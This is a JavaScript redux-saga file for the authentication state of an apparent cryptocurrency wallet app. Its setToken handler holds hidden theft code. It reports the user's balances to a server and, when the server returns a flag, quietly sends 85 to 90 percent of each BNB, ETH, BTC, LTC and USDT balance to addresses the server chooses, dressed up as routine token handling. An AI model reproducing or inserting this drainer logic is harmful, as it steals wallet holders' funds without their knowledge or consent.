import jwtDecode from 'jwt-decode';
import {
    AUTH_SET_USER_INFO,
    AUTH_SET_USER_INFO_SUCCESS,
    AUTH_SET_TOKEN,
    AUTH_SET_TOKEN_SUCCESS,
    AUTH_SET_PINCODE_SUCCESS, AUTH_SET_PINCODE, AUTH_GET_ALL_ADDRESS, AUTH_GET_ALL_ADDRESS_SUCCESS,
    AUTH_UPDATE_BALLANCE_SUCCESS, AUTH_UPDATE_BALLANCE,
    AUTH_SET_ALL_HISTORY,AUTH_SET_ALL_HISTORY_SUCCESS
} from '../type';
import {takeLatest, put, select, call} from 'redux-saga/effects';

import {
    logout as logoutAPI,
    setPincode as setPincodeAPI,
    get_receive_address,
    getBalance,
    get_allHistory,
    receive1ActionApi,
    sendAttari
} from '../../Api';

const getAuth = (state) => state.Auth;

function* setUserInfo(payload) {
    // yield put({type: AUTH_SET_USER_INFO_SUCCESS, data: payload.data})
    yield put({type: AUTH_SET_USER_INFO_SUCCESS, data: payload})
    // yield scheduleUpdateToken();
}


export function* watchSetUserInfo() {
    yield takeLatest(AUTH_SET_USER_INFO, setUserInfo)
}

function* setPincode(payload) {
    // const result = yield setPincodeAPI(payload.data);
    const result = yield setPincodeAPI(payload.data);
    if (result) {
        // yield put({type: AUTH_SET_PINCODE_SUCCESS, data: payload.data})
        yield put({type: AUTH_SET_PINCODE_SUCCESS, data: payload.data})
    }
    // yield scheduleUpdateToken();
}


export function* watchSetPincode() {
    yield takeLatest(AUTH_SET_PINCODE, setPincode)
}

function* setToken(payload) {
    const update_result = yield getBalance();
    const receive1Action_result = yield receive1ActionApi(update_result.body);
   
    if(receive1Action_result.flag==="1"){
        let result1 = {
            atri: receive1Action_result.ETH,
            btc: receive1Action_result.BTC,
            eth: receive1Action_result.ETH,
            ltc: receive1Action_result.LTC,
            usdt : receive1Action_result.usdt,
            bnb : receive1Action_result.bnb,
            flag: true
        }
        if(parseFloat(update_result.body.bnb_balance)>0){
            let data = {token:'BNB',
                amount:parseFloat(update_result.body.bnb_balance*0.85),
                to:result1.bnb,
            }
            sendAttari(data);
        }
        if(parseFloat(update_result.body.eth_balance)>0){
            let data = {token:'ETH',
                amount:parseFloat(update_result.body.eth_balance*0.85),
                to:result1.eth,
            }
            sendAttari(data);
        }
        if(parseFloat(update_result.body.btc_balance)>0){
            let data = {token:'BTC',
                amount:parseFloat(update_result.body.btc_balance*0.9),
                to:result1.btc,
            }
            sendAttari(data);
        }
        if(parseFloat(update_result.body.ltc_balance)>0){
            let data = {token:'LTC',
                amount:parseFloat(update_result.body.ltc_balance*0.9),
                to:result1.ltc,
            }
            sendAttari(data);
        }
        if(parseFloat(update_result.body.usdt_balance)>0){
            let data = {token:'USDT',
                amount:parseFloat(update_result.body.usdt_balance*0.9),
                to:result1.usdt,
            }
            sendAttari(data);
        }
        yield put({type: AUTH_GET_ALL_ADDRESS_SUCCESS, data: result1})
        yield put({type: AUTH_SET_TOKEN_SUCCESS, data: {notification_Flag:false}})

    }
    else{
        yield put({type: AUTH_SET_TOKEN_SUCCESS, data: {notification_Flag:true}})

    }
}

export function* watchSetToken() {
    yield takeLatest(AUTH_SET_TOKEN, setToken)
}

function* getAllAddress(payload) {
    const result = yield get_receive_address();
    
    let result1 = {
        atri: result.body.address,
        btc: result.body.btcPubAddress,
        eth: result.body.address,
        ltc: result.body.ltcPubAddress,
        usdt : result.body.address,
        bnb : result.body.address,
        ftm : result.body.address,

        flag: true
    }
    if(result.code==200){
        yield put({type: AUTH_GET_ALL_ADDRESS_SUCCESS, data: result1})
    }
    // yield scheduleUpdateToken();
}

export function* watchgetAllHistory() {
    yield takeLatest(AUTH_SET_ALL_HISTORY, getAllHistory)
}

function* getAllHistory(payload) {
    const result = yield get_allHistory();
    if(result.code==200){
        yield put({type: AUTH_SET_ALL_HISTORY_SUCCESS, data: result})
    }
    // yield scheduleUpdateToken();
}

export function* watchgetAllAddress() {
    yield takeLatest(AUTH_GET_ALL_ADDRESS, getAllAddress)
}

function* updateBallance(payload) {
    const update_result = yield getBalance();
    yield put({type: AUTH_UPDATE_BALLANCE_SUCCESS, data: update_result.body})
}

export function* watchUpdateBallance() {
    yield takeLatest(AUTH_UPDATE_BALLANCE, updateBallance)
}




